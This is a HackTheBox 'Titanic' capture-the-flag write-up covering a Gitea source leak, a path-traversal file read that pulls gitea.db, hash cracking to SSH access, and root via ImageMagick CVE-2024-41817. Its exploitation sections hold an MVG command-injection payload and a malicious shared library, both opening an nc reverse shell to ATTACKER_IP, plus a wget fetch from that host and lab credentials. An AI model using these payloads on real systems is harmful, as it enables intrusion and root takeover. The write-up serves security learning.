---
title: Titanic
author: Julien Bongars
date: 2026-01
link: "[app.hackthebox.com/machines/Titanic](https://app.hackthebox.com/machines/Titanic)"
banner_path: ../hackthebox.png
banner_style_light:
  filter: invert(1) hue-rotate(180deg) brightness(1.5);
tags:
  - HackTheBox
  - Medium
  - Linux
  - Hacking
---

# Titanic — Writeup

> Platform: HackTheBox · Difficulty: **Medium** · OS: **Linux**
> Target: `10.129.231.221` (`titanic.htb`)
> Ref: [app.hackthebox.com/machines/Titanic](https://app.hackthebox.com/machines/Titanic)

## Summary

Titanic exposes only SSH and Apache, and the web root redirects to `titanic.htb`. VHost fuzzing surfaces `dev.titanic.htb`, a Gitea instance whose repositories hold the booking app's source. That source leaks the app's `docker-compose.yml` (MySQL credentials) and shows that each booking is stored as a JSON file served by a `/download?ticket=` endpoint. The `ticket` parameter has no traversal filtering, so it doubles as a **local file read (path-traversal LFI)**. Reading `/etc/passwd`, the app's `app.py` (via the `/proc/self/cwd` trick) and Gitea's `app.ini` reveals the path to Gitea's SQLite database; pulling `gitea.db` through the same LFI yields the `developer` account's pbkdf2 hash, which cracks to a password and logs in over SSH.

As `developer`, `/opt/scripts/identify_images.sh` runs every minute as root: it `cd`s into a developer-writable images directory and runs `magick identify` over every `.jpg`. The installed ImageMagick is **7.1.1-35**, vulnerable to **CVE-2024-41817** — an empty entry in `MAGICK_CONFIGURE_PATH`/`LD_LIBRARY_PATH` makes `magick` load configuration files and shared libraries from the current working directory. Dropping a malicious `libxcb.so.1` into that images directory causes the root cron's `magick` to load it and run a reverse shell as root, giving both flags. The intended time-sinks are the old "ImageTragick" chain (CVE-2016-3714) and the arbitrary-file-read CVE-2022-44268 — neither applies to 7.1.1-35, and reaching for them by tool name before checking the version costs time.

---

## Recon

### Port scanning

**rustscan**

```bash
rustscan -a "$IP_ADDRESS" -ulimit 5000 -- -sC -sV -oA "nmap/quick"

[julien@parrot Titanic]$ rustscan -a "10.129.231.221" -t 1000 -- -sC -sV -oA "nmap/quick"
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "~/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.231.221:22
Open 10.129.231.221:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -oA nmap/quick" on ip 10.129.231.221
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-02 07:44 +08
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:44
Completed NSE at 07:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:44
Completed NSE at 07:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:44
Completed NSE at 07:44, 0.00s elapsed
Initiating Ping Scan at 07:44
Scanning 10.129.231.221 [2 ports]
Completed Ping Scan at 07:44, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:44
Completed Parallel DNS resolution of 1 host. at 07:44, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:44
Scanning 10.129.231.221 [2 ports]
Discovered open port 22/tcp on 10.129.231.221
Discovered open port 80/tcp on 10.129.231.221
Completed Connect Scan at 07:44, 0.00s elapsed (2 total ports)
Initiating Service scan at 07:44
Scanning 2 services on 10.129.231.221
Completed Service scan at 07:45, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.231.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.37s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.00s elapsed
Nmap scan report for 10.129.231.221
Host is up, received conn-refused (0.0058s latency).
Scanned at 2026-02-02 07:44:57 +08 for 6s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:45
Completed NSE at 07:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds

[julien@parrot Titanic]$
```

**nmap (full)**

```bash
nmap -sC -sV -p- -oA "nmap/full" "$IP_ADDRESS"

[julien@parrot Titanic]$ nmap -sC -sV -p- -oA "nmap/full" "10.129.231.221"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-02 07:45 +08
Nmap scan report for 10.129.231.221
Host is up (0.0045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: SSH (OpenSSH 8.9p1) and Apache 2.4.52. The web root redirects to `titanic.htb` — add it to `/etc/hosts`.

### Enumeration

VHost fuzzing with `ffuf`, filtering the `301` redirect, returns a single subdomain, `dev`:

```bash
[julien@parrot Titanic]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb -H 'Host: FUZZ.titanic.htb' -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 15ms]
:: Progress: [114441/114441] :: Job [1/1] :: 7142 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
[julien@parrot Titanic]$
```

`dev.titanic.htb` hosts a Gitea instance — add it to `/etc/hosts` as well.

#### `dev.titanic.htb` — Gitea

![](.media/20260202215556.png)

The repositories hold the source for the booking app. The `docker-compose.yml` leaks the database service and its credentials:

```docker-compose.yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Walking the git history with `git rebase -i --root` surfaces an example ticket, showing the app stores each booking as a JSON file keyed by a UUID:

```bash
diff --git a/tickets/2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json b/tickets/2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json
new file mode 100644
index 0000000..eac92f6
--- /dev/null
+++ b/tickets/2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json
@@ -0,0 +1 @@
+{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
\ No newline at end of file
[julien@parrot flask-app]$
```

```json
{
  "name": "Rose DeWitt Bukater",
  "email": "rose.bukater@titanic.htb",
  "phone": "643-999-021",
  "date": "2024-08-22",
  "cabin": "Suite"
}
```

The load-bearing detail is that tickets are files on disk, downloaded by name — which is what makes the download endpoint on the main site exploitable. The MySQL credentials from `docker-compose.yml` are noted but are not on the path taken.

---

## Stage 1: LFI on the ticket download → config & database exfiltration

On `titanic.htb`, booking a ticket produces a download link of the form `/download?ticket=<uuid>.json`. The `ticket` parameter is a path with no traversal filtering, so it doubles as a local file read.

![](.media/20260202220024.png)

Reading `/etc/passwd`:

```/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

The only interactive accounts are `root` and `developer`:

```/etc/passwd (truncated)
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Using the `/proc/self/cwd` trick, the app's own `app.py` is retrieved from the working directory, confirming the download handler and the app layout.

### Gitea config → database path

Gitea keeps its configuration in `app.ini`, which on this host sits under the developer's home at `/home/developer/gitea/data/gitea/conf/app.ini`, pulled through the same LFI:

```app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

The config points at a SQLite database:

```txt
PATH = /data/gitea/gitea.db
```

which on the host maps to `/home/developer/gitea/data/gitea/gitea.db`. Pull it through the LFI (request captured from Burp):

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: titanic.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://titanic.htb/' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' \
    $'http://titanic.htb/download?ticket=../../../../../../../../../home/developer/gitea/data/gitea/gitea.db'
    -o ./gitea.db
```

Stage result: a local copy of `gitea.db`.

---

## Stage 2: Crack the Gitea hash → SSH as developer

Querying the downloaded database dumps the `user` table schema and rows:

```txt
sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `lower_name` TEXT NOT NULL
, `name` TEXT NOT NULL
, `full_name` TEXT NULL
, `email` TEXT NOT NULL
, `keep_email_private` INTEGER NULL
, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL
, `passwd` TEXT NOT NULL
, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL
, `must_change_password` INTEGER DEFAULT 0 NOT NULL
, `login_type` INTEGER NULL
, `login_source` INTEGER DEFAULT 0 NOT NULL
, `login_name` TEXT NULL
, `type` INTEGER NULL
, `location` TEXT NULL
, `website` TEXT NULL
, `rands` TEXT NULL
, `salt` TEXT NULL
, `language` TEXT NULL
, `description` TEXT NULL
, `created_unix` INTEGER NULL
, `updated_unix` INTEGER NULL
, `last_login_unix` INTEGER NULL
, `last_repo_visibility` INTEGER NULL
, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL
, `is_active` INTEGER NULL
, `is_admin` INTEGER NULL
, `is_restricted` INTEGER DEFAULT 0 NOT NULL
, `allow_git_hook` INTEGER NULL
, `allow_import_local` INTEGER NULL
, `allow_create_organization` INTEGER DEFAULT 1 NULL
, `prohibit_login` INTEGER DEFAULT 0 NOT NULL
, `avatar` TEXT NOT NULL
, `avatar_email` TEXT NOT NULL
, `use_custom_avatar` INTEGER NULL
, `num_followers` INTEGER NULL
, `num_following` INTEGER DEFAULT 0 NOT NULL
, `num_stars` INTEGER NULL
, `num_repos` INTEGER NULL
, `num_teams` INTEGER NULL
, `num_members` INTEGER NULL
, `visibility` INTEGER DEFAULT 0 NOT NULL
, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL
, `diff_view_style` TEXT DEFAULT '' NOT NULL
, `theme` TEXT DEFAULT '' NOT NULL
, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);
sqlite>
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1
722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722
603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
sqlite>
```

The two accounts and their pbkdf2 hashes:

| id | email                 | passwd                                                                                               | passwd_hash_algo | salt                             | is_admin |
| -- | --------------------- | ---------------------------------------------------------------------------------------------------- | ---------------- | -------------------------------- | -------- |
| 1  | root@titanic.htb      | cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136 | pbkdf2$50000$50  | 2d149e5fbd1b20cf31db3e3c6a28fc9b | 1        |
| 2  | developer@titanic.htb | e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 | pbkdf2$50000$50  | 8bf3e3452b78544f8bee9400d6936d34 | 0        |

`giteaToHashcat.py` ([BhattJayD/giteatohashcat](https://github.com/BhattJayD/giteatohashcat)) converts the stored hashes into hashcat's format:

```bash
(venv) [julien@parrot giteatohashcat]$ python giteaToHashcat.py <../gitea.db
usage: giteaToHashcat.py [-h] db_path
giteaToHashcat.py: error: the following arguments are required: db_path
(venv) [julien@parrot giteatohashcat]$ python giteaToHashcat.py ../gitea.db
[+] Extracting password hashes...
[+] Extraction complete. Output:
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
(venv) [julien@parrot giteatohashcat]$
```

Cracking the `developer` hash recovers the password:

```
developer password: 25282528
```

<!-- TODO: hashcat crack command / mode not captured in draft -->

Those credentials log in over SSH:

```bash
nxc ssh -u users.txt -p 25282528
ssh developer@titanic.htb
```

Stage result: an interactive SSH shell as `developer`.

<!-- TODO: user flag (user.txt) not captured in draft -->

---

## Stage 3: Root via ImageMagick CVE-2024-41817 cron

### Finding the cron job

`/opt/scripts/identify_images.sh` runs `magick identify` over every `.jpg` after changing into the images directory:

```bash
developer@titanic:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
developer@titanic:/opt/scripts$
```

`metadata.log` is owned by root and rewritten every minute, so the script runs as root on a one-minute cron:

```bash
developer@titanic:/opt/scripts$ ls -l --full-time /opt/app/static/assets/images/metadata.log
-rw-r----- 1 root developer 442 2026-02-03 17:19:02.397135254 +0000 /opt/app/static/assets/images/metadata.log
```

`magick` is version **7.1.1-35**:

```bash
developer@titanic:/opt/scripts$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
developer@titanic:/opt/scripts$
```

The script `cd`s into `/opt/app/static/assets/images` — writable by `developer` — before invoking `magick`, so anything `magick` loads relative to that directory is attacker-controlled.

### Dead end: CVE-2022-44268

First attempt used [entr0pie/CVE-2022-44268](https://github.com/entr0pie/CVE-2022-44268). CVE-2022-44268 is an ImageMagick _arbitrary file read_ — it leaks a file's contents into the output image's metadata — not code execution. That's the wrong primitive: it can't turn a root-run `identify` into a shell.

### Dead end: ImageTragick (CVE-2016-3714)

Next, "ImageTragick." Two public PoCs were tried — [dorkerdevil/ImageTragick_exploit](https://github.com/dorkerdevil/ImageTragick_exploit) (found via `poc magick rce`) and [ImageTragick/PoCs](https://github.com/ImageTragick/PoCs). Both build a malicious MVG/image that smuggles a shell command through a `fill 'url(...)'` field — here an `mknod`/`nc` reverse shell. Reformatted to the target:

```poisoned_image.mvg
push graphic-context 

viewbox 0 0 640 480

fill 'url(https://example.com/image.jpg"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc ATTACKER_IP 4444 1>/tmp/pipez;rm -rf "/tmp/pipez)'

pop graphic-context
```

Hosted the file and dropped it into the images directory:

```bash
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
developer@titanic:/opt$ cd /opt/app/static/assets/images/
developer@titanic:/opt/app/static/assets/images$ wget 'http://ATTACKER_IP:80/poisoned_image.mvg' -o pimage.mvg
developer@titanic:/opt/app/static/assets/images$ [
```

This never fired. CVE-2016-3714 targets much older ImageMagick coder/delegate handling and doesn't apply to 7.1.1-35. Matching the exploit to the tool's name ("ImageMagick RCE") instead of its version is the trap.

### Working path: CVE-2024-41817

The version-specific vulnerability is **CVE-2024-41817** ([Dxsk/CVE-2024-41817-poc](https://github.com/Dxsk/CVE-2024-41817-poc)). In 7.1.1-35, an empty entry in `MAGICK_CONFIGURE_PATH` or `LD_LIBRARY_PATH` makes `magick` resolve its `delegates.xml` / shared libraries from the current working directory. Because the cron `cd`s into the developer-writable images directory before running `magick`, a malicious `libxcb.so.1` planted there is loaded and executed when root's `magick` runs. (Full technique — the `delegates.xml` variant and the `LD_LIBRARY_PATH` variant — is documented in the linked repo.)

Build the shared library with the reverse shell in its constructor (the author's own variant of the PoC's `libxcb.so.1`):

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc ATTACKER_IP 4444 1>/tmp/pipez;rm -rf /tmp/pipez");
    exit(0);
}
EOF
```

Drop `libxcb.so.1` into `/opt/app/static/assets/images/` and wait up to a minute for the root cron to run `magick`. The listener catches the root callback:

```bash
[julien@parrot nvim]$ nc -lvnp 4444
Listening on 0.0.0.0 4444


















Connection received on 10.129.231.221 50768



ls
delegates.xml
entertainment.jpg
exquisite-dining.jpg
favicon.ico
home2.jpg
home.jpg
libxcb.so.1
luxury-cabins.jpg
metadata.log


whoami
root
cd /root
ls
cleanup.sh
images
revert.sh
root.txt
snap
cat root.txt
6ab622f01ff31bfee7d21892fbbbaa71
```

Stage result: a shell as `root` and `root.txt`. The shell wasn't upgraded — the callback lands directly as root, so it wasn't needed.

---

## Credentials

**`docker-compose.yml` (Gitea repo)** — MySQL root: `root:MySQLP@$$w0rd!`
Not used on the path taken.

**`docker-compose.yml` (Gitea repo)** — MySQL app user: `sql_svc:sql_password`
Not used on the path taken.

**`gitea.db` `user` table** — `administrator` pbkdf2 hash (see Stage 2)
Not cracked.

**`gitea.db` `user` table** — `developer` pbkdf2 hash → `25282528`
Cracked; foothold.

**SSH** — `developer:25282528`
Foothold shell.

---

## Key lessons

- **Match the exploit to the version, not the tool's reputation.** "ImageMagick RCE" pulls up ImageTragick (CVE-2016-3714) first, but the root here was CVE-2024-41817, which is specific to the 7.1.1-x build. Two ImageTragick PoCs and CVE-2022-44268 were burned before checking what actually matched 7.1.1-35.
- **Version-check any binary a privileged job runs before pulling an exploit.** `magick --version` up front points straight at the right CVE and skips the dead ends. Add "check the version of the tool the cron/root job calls" to the privesc checklist.
- **Chain config leaks to the crown-jewel file.** `docker-compose.yml` gave the app shape, `app.ini` gave the SQLite path, and the LFI turned that path into the `gitea.db` download and the developer hash. Each leak fed the next.
- **`/proc/self/cwd` upgrades a blind LFI into source disclosure.** It resolves the app's working directory without knowing the absolute install path, which is how `app.py` came out.
- **With CVE-2024-41817 the writable working directory is the vulnerability, not the image.** The fix in mindset is realizing the root cron `cd`s into a dir you control and `magick` loads `libxcb.so.1` / `delegates.xml` from an empty path entry — poisoning a `.jpg` (ImageTragick-style) was the wrong model.

### What went right

- Reached the Gitea instance and the ticket-download LFI through vhost fuzzing and reading the app source.
- Kept the config-leak chain tight and in order: `docker-compose.yml` → `app.ini` → `gitea.db`.
- Pushed the escalation straight to root without fighting to upgrade a shell — the callback landed as root.

---

## Tools & cheat sheet

- [`rustscan`](/hacklas/enumeration/port-scan/rustscan.md) — Fast port sweep feeding nmap
- [`nmap`](/hacklas/enumeration/port-scan/nmap.md) — Full-range service/script scan
- [`ffuf`](/hacklas/enumeration/ffuf.md) — VHost discovery (found `dev`)
- [Gitea (`dev.titanic.htb`)](/hacklas/enumeration/git/gitea.md) — Leaked `docker-compose.yml` + app source
- [LFI `/download?ticket=`](/hacklas/infiltration/web/file-traversal-lfi-rfi.md) — Path-traversal file read → config + `gitea.db`
- [`sqlite3`](/hacklas/enumeration/db/sqlite.md) — Read Gitea `user` table
- **`giteaToHashcat.py`** — Convert Gitea hash → hashcat format
- [`hashcat`](/hacklas/infiltration/cracking/hashcat.md) — Crack developer pbkdf2 hash → `25282528`
- [`nxc`](/hacklas/infiltration/password_spray/nxc.md) / **`ssh`** — Validate creds, log in as `developer`
- **`magick --version`** — Confirm ImageMagick 7.1.1-35
- **`gcc`** — Build malicious `libxcb.so.1` (constructor RCE)
- **CVE-2024-41817 PoC** — Empty-path config/lib load → root
  - [Dxsk/CVE-2024-41817-poc](https://github.com/Dxsk/CVE-2024-41817-poc)
- **cron (`/opt/scripts/identify_images.sh`)** — Root-run `magick` over images dir (trigger)
